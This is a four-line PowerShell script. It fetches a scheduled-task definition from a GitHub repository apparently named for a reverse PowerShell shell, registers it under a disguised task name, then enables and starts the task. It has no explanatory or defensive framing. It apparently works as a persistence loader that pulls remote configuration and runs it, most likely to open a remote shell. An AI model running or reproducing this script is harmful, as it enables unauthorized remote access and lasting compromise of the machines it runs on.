Register-ScheduledTask -Xml (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/RacoonK1ng/Reverse-Powershell/refs/heads/main/Task.xml").Content -TaskName "SYSTEMexecutionWindowsbullshit" -Force
Enable-ScheduledTask -TaskName "SYSTEMexecutionWindowsbullshit"
Start-ScheduledTask -TaskName "SYSTEMexecutionWindowsbullshit"
exit
